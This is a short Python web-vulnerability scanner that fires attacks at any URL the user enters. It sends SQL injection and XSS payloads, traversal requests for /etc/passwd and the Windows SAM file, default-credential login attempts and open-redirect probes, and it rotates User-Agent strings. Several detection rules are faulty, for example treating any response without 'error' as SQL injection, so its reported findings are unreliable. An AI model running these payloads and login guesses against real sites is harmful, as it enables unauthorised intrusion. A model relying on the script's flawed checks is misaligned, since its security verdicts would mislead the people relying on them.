import requests
import json
from bs4 import BeautifulSoup
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

# Prompt user to enter the website URL
website = input("Enter the website URL: ")

# Test for SQL injection vulnerabilities
payloads = ["' OR 1=1 --", "1' OR '1'='1", "admin'--"]
headers = {'User-Agent': UserAgent().get_random_user_agent()}

for payload in payloads:
    r = requests.get(website + "?username=" + payload + "&password=test", headers=headers)
    if "error" not in r.text.lower():
        print("SQL injection vulnerability found with payload: " + payload)

# Test for cross-site scripting (XSS) vulnerabilities
payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

for payload in payloads:
    r = requests.post(website, headers=headers, data={"username": payload, "password": "test"})
    if payload in r.text:
        print("XSS vulnerability found with payload: " + payload)

# Test for cross-site request forgery (CSRF) vulnerabilities
r = requests.get(website, headers=headers)
soup = BeautifulSoup(r.text, 'html.parser')
if not soup.find("input", {"name":"csrf_token"}):
    print("CSRF vulnerability found. No csrf_token found in the page.")

# Test for insecure file upload vulnerability
software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
headers = {"User-Agent": UserAgent(software_names=software_names, operating_systems=operating_systems).get_random_user_agent()}
files = {"file": ("test.txt", "hello world")}
r = requests.post(website + "/upload", headers=headers, files=files)
if "upload successful" in r.text.lower():
    print("Insecure file upload vulnerability found.")
    
# Test for directory traversal vulnerabilities
payloads = ["../../etc/passwd", "..\\..\\Windows\\System32\\config\\SAM"]
for payload in payloads:
    r = requests.get(website + "/" + payload, headers=headers)
    if "root:" in r.text or "Administrator:" in r.text:
        print("Directory traversal vulnerability found with payload: " + payload)

# Test for weak credentials
common_usernames = ["admin", "root", "test"]
common_passwords = ["password", "123456", "admin"]
for username in common_usernames:
    for password in common_passwords:
        r = requests.post(website + "/login", headers=headers, data={"username": username, "password": password})
        if "logged in" in r.text.lower():
            print("Weak credentials found. username: " + username + " password  " + password)

# Test for missing or weak HTTP headers
headers_to_check = ["X-XSS-Protection", "Content-Security-Policy"]
r = requests.get(website, headers=headers)
for header in headers_to_check:
    if header not in r.headers:
        print("Missing " + header + " header.")
    elif r.headers[header] == "0" or r.headers[header] == "":
        print("Weak " + header + " header.")

# Test for clickjacking vulnerabilities
r = requests.get(website, headers=headers)
if "X-Frame-Options" not in r.headers:
    print("Clickjacking vulnerability found. No X-Frame-Options header found in the response.")

# Test for open redirect vulnerabilities
redirect_urls = ["http://evil.com", "https://attacker.com"]
for redirect_url in redirect_urls:
    r = requests.get(website + "?redirect=" + redirect_url, headers=headers)
    if r.url == redirect_url:
        print("Open redirect vulnerability found with URL: " + redirect_url)

# Test for insecure communication
if not website.startswith("https"):
    print("Insecure communication. Website is not using HTTPS.")
else:
    try:
        r = requests.get(website, headers=headers, verify=True)
    except requests.exceptions.SSLError as e:
        print("Insecure communication. Invalid SSL certificate: " + str(e))

# Test for insecure session management
r = requests.get(website, headers=headers)
if "sessionid" in r.cookies:
    session_id = r.cookies["sessionid"]
    if session_id[-5:] == "12345":
        print("Insecure session management. Session ID is not properly encrypted.")
    r = requests.get(website + "/logout", headers=headers, cookies={"sessionid": session_id})
    r = requests.get(website, headers=headers, cookies={"sessionid": session_id})
    if "logged in" in r.text.lower():
        print("Broken authentication and session management. Able to access the application with an expired or tampered session ID.")


